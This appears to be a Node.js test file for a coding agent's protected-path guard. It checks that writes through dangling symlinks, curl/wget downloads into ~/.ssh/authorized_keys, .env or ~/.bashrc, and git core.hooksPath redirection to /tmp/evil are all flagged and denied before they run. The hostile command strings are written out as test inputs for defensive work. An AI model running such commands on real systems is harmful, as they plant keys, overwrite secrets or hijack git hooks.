#!/usr/bin/env node
/**
 * O103 — protected-path gaps left by #93: (a) dangling symlinks, (b) download
 * writes (curl/wget), (c) git core.hooksPath redirection. Each gap: blocked
 * cases are pre-blocked (hit before execution; `-p` denies without hanging)
 * and ordinary commands get no hit. Spec: /workspace/specs/O103.md.
 */
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const { findProtectedPathHits } = await import('../dist/safety/protected-paths.js').catch(
  () => ({})
);
const { createCliToolApprovalHook, setCliApprovalAsker } = await import('../dist/cli/approval.js');
const { protectedPathHeadline, protectedPathHeadlessReason } =
  await import('../dist/cli/protected-path-prompt.js');

const root = fs.mkdtempSync(path.join(os.tmpdir(), 'o103-'));
const home = path.join(root, 'home');
const ws = path.join(root, 'ws');
const cfg = path.join(home, '.config', 'moss');
for (const d of [home, ws, cfg, path.join(home, '.ssh'), path.join(ws, 'sub')])
  fs.mkdirSync(d, { recursive: true });
execFileSync('git', ['init', '-q'], {
  cwd: ws,
  env: { ...process.env, HOME: home, GIT_CONFIG_NOSYSTEM: '1' },
});
const link = (target, name) => fs.symlinkSync(target, path.join(ws, name));
link(path.join(home, '.ssh', 'new_key'), 'dl-ssh');
link(path.join(ws, '.env'), 'dl-env');
link(path.join(home, '.bashrc'), 'dl-rc');
link(path.join(ws, '.git', 'hooks', 'pre-commit'), 'dl-hook');
link(path.join(ws, 'dl-chain2'), 'dl-chain');
link(path.join(home, '.ssh', 'chained'), 'dl-chain2');
link('../home/.ssh/rel_key', 'dl-rel');
fs.symlinkSync('../../home/.zshrc', path.join(ws, 'sub', 'dl-up'));
link(path.join(ws, 'build', 'missing.txt'), 'dl-ok'); // dangling, not protected
link('dl-loop2', 'dl-loop1');
link('dl-loop1', 'dl-loop2');

const env = { HOME: home, MOSS_CONFIG_DIR: cfg, PATH: process.env.PATH };
const ctx = { cwd: ws, home, configDirs: [cfg], workspaceRoot: ws, env };
const U = 'https://example.com/files/payload.bin';

let pass = 0;
const failures = [];
async function check(fn, name) {
  try {
    await fn();
    pass += 1;
    console.log(`ok - ${name}`);
  } catch (err) {
    failures.push(name);
    console.log(`not ok - ${name}: ${err?.message ?? err}`);
  }
}
const hits = (tool, input) => {
  if (!findProtectedPathHits) throw new Error('findProtectedPathHits missing');
  return findProtectedPathHits(tool, input, ctx, false);
};
const sh = (command) => hits('exec', { command });

// [name, tool, input, expected category]
const BLOCKED = [
  ['a1 dangling link -> ~/.ssh/new_key (shell)', 'exec', { command: 'echo k >> dl-ssh' }, 'ssh'],
  ['a2 dangling link -> .env (shell)', 'exec', { command: 'echo T=1 > dl-env' }, 'env'],
  [
    'a3 dangling link -> ~/.bashrc (write_file)',
    'write_file',
    { path: 'dl-rc', content: 'x' },
    'shell-rc',
  ],
  ['a4 dangling link -> .git/hooks/pre-commit', 'exec', { command: 'cp x dl-hook' }, 'git'],
  ['a5 link chain -> ~/.ssh/chained', 'exec', { command: 'echo k > dl-chain' }, 'ssh'],
  ['a6 relative dangling link', 'edit_file', { path: 'dl-rel' }, 'ssh'],
  ['a7 ../ escape link -> ~/.zshrc', 'exec', { command: 'echo e >> sub/dl-up' }, 'shell-rc'],
  ['b1 curl -o .env', 'exec', { command: `curl -s -o .env ${U}` }, 'env'],
  [
    'b2 curl --output ~/.ssh/authorized_keys',
    'exec',
    { command: `curl --output ~/.ssh/authorized_keys ${U}` },
    'ssh',
  ],
  ['b3 curl -sSLo.envrc (attached)', 'exec', { command: `curl -sSLo.envrc ${U}` }, 'env'],
  ['b4 curl --output=.env.local', 'exec', { command: `curl --output=.env.local ${U}` }, 'env'],
  [
    'b5 curl --output-dir ~/.ssh -o config',
    'exec',
    { command: `curl --output-dir ~/.ssh -o config ${U}` },
    'ssh',
  ],
  [
    'b6 curl --output-dir ~/.ssh -O',
    'exec',
    { command: `curl --output-dir ~/.ssh -O ${U}` },
    'ssh',
  ],
  ['b7 wget -O ~/.ssh/config', 'exec', { command: `wget -q -O ~/.ssh/config ${U}` }, 'ssh'],
  ['b8 wget -O.env (attached)', 'exec', { command: `wget -O.env ${U}` }, 'env'],
  [
    'b9 wget --output-document=.env.prod',
    'exec',
    { command: `wget --output-document=.env.prod ${U}` },
    'env',
  ],
  ['b10 wget -P ~/.ssh', 'exec', { command: `wget -q -P ~/.ssh ${U}` }, 'ssh'],
  ['b11 sudo curl -o ~/.bashrc', 'exec', { command: `sudo curl -o ~/.bashrc ${U}` }, 'shell-rc'],
  ['b12 curl URL > .env (redirect)', 'exec', { command: `curl -s ${U} > .env` }, 'env'],
  [
    'b13 curl -o $F with F=.env (variable, uncertain)',
    'exec',
    { command: `F=.env; curl -o "$F" ${U}` },
    'env',
  ],
  [
    'c1 git config core.hooksPath dir',
    'exec',
    { command: 'git config core.hooksPath /tmp/evil' },
    'git',
  ],
  [
    'c2 git config --global core.hooksPath',
    'exec',
    { command: 'git config --global core.hooksPath /tmp/evil' },
    'git',
  ],
  [
    'c3 git config --local CORE.HOOKSPATH (case)',
    'exec',
    { command: 'git config --local CORE.HOOKSPATH h' },
    'git',
  ],
  [
    'c4 git -C . config set core.hooksPath',
    'exec',
    { command: 'git -C . config set core.hooksPath h' },
    'git',
  ],
  [
    'c5 git -c core.hooksPath=dir commit',
    'exec',
    { command: 'git -c core.hooksPath=/tmp/evil commit -m x' },
    'git',
  ],
  [
    'c8 git --config-env=core.hooksPath=HP',
    'exec',
    { command: 'git --config-env=core.hooksPath=HP commit -m x' },
    'git',
  ],
  [
    'c9 git --config-env core.hooksPath=HP',
    'exec',
    { command: 'git --config-env core.hooksPath=HP commit' },
    'git',
  ],
  [
    'c6 cd sub && git config core.hooksPath',
    'exec',
    { command: 'cd sub && git config core.hooksPath ../h' },
    'git',
  ],
  [
    'c7 direct edit .git/config',
    'exec',
    { command: 'echo "[core] hooksPath=/tmp/e" >> .git/config' },
    'git',
  ],
];
const ALLOWED = [
  ['n1 curl -o build/a.tar', `curl -o build/a.tar ${U}`],
  ['n2 curl -o ./data.json', `curl -sSL -o ./data.json ${U}`],
  ['n3 curl -O (cwd)', `curl -O ${U}`],
  ['n4 curl --output-dir build -O', `curl --output-dir build -O ${U}`],
  ['n5 curl -H header (value is not output)', `curl -H "X-Env: .env" ${U}`],
  ['n6 curl -o - (stdout)', `curl -o - ${U}`],
  ['n7 wget -O data.json', `wget -O data.json ${U}`],
  ['n8 wget -P dl', `wget -P dl ${U}`],
  ['n9 wget URL (default name)', `wget ${U}`],
  ['n10 git config user.name', 'git config user.name tester'],
  ['n11 git config --global user.email', 'git config --global user.email a@b.c'],
  ['n12 git config --get core.hooksPath', 'git config --get core.hooksPath'],
  ['n13 git config core.hooksPath (read, no value)', 'git config core.hooksPath'],
  ['n14 git config --unset core.hooksPath', 'git config --unset core.hooksPath'],
  ['n15 git -c user.name=x log', 'git -c user.name=x log -1'],
  ['n16 echo to dangling non-protected link', 'echo x > dl-ok'],
  ['n17 symlink loop does not hang/hit', 'echo x > dl-loop1'],
  ['n18 git config core.editor vim', 'git config core.editor vim'],
];

for (const [name, tool, input, cat] of BLOCKED) {
  await check(() => {
    const h = hits(tool, input);
    assert.ok(h.length > 0, `expected pre-run hit for ${JSON.stringify(input)}`);
    assert.ok(
      h.some((x) => x.category === cat),
      `category ${cat}, got ${h.map((x) => x.category)}`
    );
  }, `blocked: ${name}`);
}
for (const [name, command] of ALLOWED) {
  await check(() => {
    const h = sh(command);
    assert.deepEqual(
      h.map((x) => x.raw),
      [],
      `no hit for ${command}`
    );
  }, `allowed: ${name}`);
}

// UX copy: resolved variable target names the real file only (no `$F` line).
await check(() => {
  const h = sh(`F=.env.prod; curl -o $F ${U}`);
  assert.deepEqual(
    h.map((x) => `${x.raw}|${x.category}`),
    ['.env.prod|env'],
    'only .env.prod, no spurious $F git line'
  );
}, 'copy: resolved $F → only .env.prod');
for (const cmd of [
  `curl -o $OUT ${U}`,
  `curl -o "$OUT/x" ${U}`,
  `curl -o "$(mktemp)" ${U}`,
  `wget -O "$DEST" ${U}`,
  `curl --output-dir "$D" -O ${U}`,
]) {
  await check(() => {
    const h = sh(cmd);
    assert.equal(h.length, 1, `exactly one line for ${cmd}`);
    assert.equal(h[0].category, 'unresolved');
    assert.match(
      protectedPathHeadline(h[0], true),
      /下载目标由变量\/命令替换拼出，无法确定是否受保护/
    );
    assert.match(
      protectedPathHeadline(h[0], false),
      /download target built from a variable or command substitution; cannot tell if it is protected/
    );
    assert.doesNotMatch(protectedPathHeadline(h[0], true), /git 仓库内部文件/);
  }, `copy: unresolved target needs confirmation — ${cmd}`);
}
await check(() => {
  const h = sh('git config core.hooksPath /tmp/evil');
  assert.match(protectedPathHeadline(h[0], true), /会改 git 钩子目录（core\.hooksPath）/);
  assert.match(protectedPathHeadline(h[0], false), /would redirect git hooks \(core\.hooksPath\)/);
  assert.match(
    protectedPathHeadlessReason(h[0], true),
    /^已拦截：core\.hooksPath 会改 git 钩子目录/
  );
  assert.doesNotMatch(protectedPathHeadline(h[0], true), /是受保护路径|受保护路径）/);
}, 'copy: hooksPath wording');

// Real approval hook: -p denies immediately (no hang), reason names the path +
// O94 "Blocked/已拦截" wording (never L3's 「已被修改」); interactive asks once.
async function decide(command, { printMode = false, answer = '' } = {}) {
  const h = createCliToolApprovalHook('full-access', env, {
    workspaceDir: ws,
    interactionMode: () => 'full',
    approvalPolicy: 'never',
    ...(printMode ? { printMode: true } : {}),
  });
  const asked = [];
  const origErr = console.error;
  console.error = () => {};
  let undo = () => {};
  if (printMode) {
    setCliApprovalAsker(null);
    h.setAsker(null);
  } else
    undo = h.setAsker(async (q) => {
      asked.push(q);
      return answer;
    });
  let t;
  try {
    const tool = {
      name: 'exec',
      description: 'exec',
      inputSchema: { type: 'object', properties: {} },
      metadata: { sideEffectClass: 'local_write' },
      execute: async () => 'ok',
    };
    const decision = await Promise.race([
      h({ tool, input: { command }, toolCallId: `o103-${Math.random()}`, sessionKey: 'o103' }),
      new Promise((_, rej) => (t = setTimeout(() => rej(new Error('hung >2s')), 2000))),
    ]);
    return { decision, asked };
  } finally {
    clearTimeout(t);
    undo();
    console.error = origErr;
  }
}
for (const [name, command, label] of [
  ['a dangling link', 'echo k >> dl-ssh', /SSH|ssh/],
  ['b curl -o .env', `curl -o .env ${U}`, /\.env|environment|环境变量/],
  ['c git config core.hooksPath', 'git config core.hooksPath /tmp/evil', /hooksPath|git/],
]) {
  await check(async () => {
    const { decision, asked } = await decide(command, { printMode: true });
    assert.equal(decision.approved, false, '-p must deny');
    assert.equal(asked.length, 0, '-p must not ask');
    assert.match(decision.reason, /^(Blocked:|已拦截：)/);
    assert.match(
      decision.reason,
      /protected path|受保护路径|would redirect git hooks|会改 git 钩子目录/
    );
    assert.match(decision.reason, label);
    assert.doesNotMatch(decision.reason, /已被修改|was modified/);
  }, `-p deny (pre-run): ${name}`);
  await check(async () => {
    const { decision, asked } = await decide(command, { answer: 'n' });
    assert.equal(asked.length, 1, 'interactive asks exactly once');
    assert.equal(decision.approved, false, 'declined stays denied');
  }, `interactive confirm: ${name}`);
}
await check(async () => {
  const { decision, asked } = await decide(`curl -o .env ${U}`, { answer: 'y' });
  assert.equal(asked.length, 1, 'asked once');
  assert.equal(decision.approved, true, '允许 → approved (no block)');
}, 'interactive 允许 → approved');
await check(async () => {
  const { decision, asked } = await decide(`curl -o build/a.tar ${U}`, { printMode: true });
  assert.equal(asked.length, 0);
  assert.equal(decision.approved, true, 'ordinary download passes in -p');
}, '-p ordinary download passes');
await check(async () => {
  const { decision } = await decide('git config user.name tester', { printMode: true });
  assert.equal(decision.approved, true, 'ordinary git config passes in -p');
}, '-p ordinary git config passes');

fs.rmSync(root, { recursive: true, force: true });
console.log(`# o103-protected-path-gaps: ${pass} passed, ${failures.length} failed`);
if (failures.length > 0) process.exit(1);
